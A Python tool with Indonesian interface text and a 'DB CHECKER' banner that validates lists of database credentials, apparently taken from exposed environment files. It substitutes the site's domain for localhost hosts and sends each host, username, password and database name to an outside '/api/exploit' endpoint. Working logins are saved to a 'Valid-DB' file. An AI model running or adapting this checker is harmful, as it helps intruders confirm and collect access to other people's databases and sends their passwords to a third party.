import os
import requests
from urllib.parse import urlparse
from datetime import datetime
from pystyle import Write, Colors, Colorate, Center
from colorama import Fore, Style, init

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii():
    banner = r"""
██████╗ ██████╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║  ██║██████╔╝    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║  ██║██╔══██╗    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██████╔╝    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═════╝ ╚═════╝      ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """
    print(Center.XCenter(Colorate.Horizontal(Colors.red_to_green, banner, 1)))
    print()

def check_db_connection(url_api, data, output_file):
    try:
        url_origin = data.get('URL')
        host = data.get('DB_HOST')
        user = data.get('DB_USERNAME')
        password = data.get('DB_PASSWORD')
        database = data.get('DB_DATABASE')

        if host in ['127.0.0.1', 'localhost']:
            parsed_url = urlparse(url_origin)
            domain = parsed_url.hostname
            Write.Print(f"🔄 Host awal: {host} → Diganti dengan domain: {domain}\n", Colors.yellow_to_green, interval=0.001)
            host = domain

        params = {
            'host': host,
            'user': user,
            'password': password,
            'database': database,
        }

        response = requests.get(url_api, params=params)
        json_response = response.json()

        Write.Print(f"\n[URL] {url_origin}\n", Colors.blue_to_cyan, interval=0.001)
        Write.Print(f"[Host] {host}\n", Colors.blue_to_cyan, interval=0.001)
        Write.Print(f"[Status] {response.status_code}\n", Colors.blue_to_cyan, interval=0.001)
        Write.Print(f"[Response] {json_response}\n", Colors.blue_to_cyan, interval=0.001)

        if json_response.get('message') == 'Koneksi berhasil':
            Write.Print("✅ Koneksi berhasil - simpan ke Valid-DB\n", Colors.green_to_yellow, interval=0.001)
            
            # Save valid entry immediately
            with open(output_file, 'a') as f_out:
                f_out.write(f"URL: {url_origin}\n")
                f_out.write(f"DB_HOST: {host}\n")
                f_out.write(f"DB_DATABASE: {database}\n")
                f_out.write(f"DB_USERNAME: {user}\n")
                f_out.write(f"DB_PASSWORD: {password}\n\n")
            
            return True
        else:
            Write.Print("❌ Koneksi gagal\n", Colors.red_to_yellow, interval=0.001)
            return False

    except Exception as e:
        Write.Print(f"❌ Error: {e}\n", Colors.red_to_yellow, interval=0.001)
        return False

def main():
    clear()
    print_ascii()
    url_api = 'https://db-checker.vercel.app/api/exploit'

    input_file = Write.Input("Masukkan path file list.txt: ", Colors.green_to_yellow, interval=0.005)
    if not os.path.exists(input_file):
        Write.Print("❌ File tidak ditemukan!\n", Colors.red_to_yellow, interval=0.001)
        return

    os.makedirs("Valid-DB", exist_ok=True)
    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_file = os.path.join("Valid-DB", f"valid_db_{now}.txt")

    with open(input_file, 'r') as file:
        content = file.read()

    blocks = content.strip().split('\n\n')
    valid_count = 0

    for block in blocks:
        lines = block.strip().split('\n')
        data = {}

        for line in lines:
            if ':' not in line:
                continue
            key, value = line.split(':', 1)
            key = key.strip()
            value = value.strip().strip('"')
            data[key] = value

        if check_db_connection(url_api, data, output_file):
            valid_count += 1

    Write.Print(f"\n✅ Selesai! Valid DB disimpan di: {output_file}\n", Colors.green_to_yellow, interval=0.005)
    Write.Print(f"📊 Total valid: {valid_count}\n", Colors.green_to_yellow, interval=0.005)

if __name__ == "__main__":
    main()
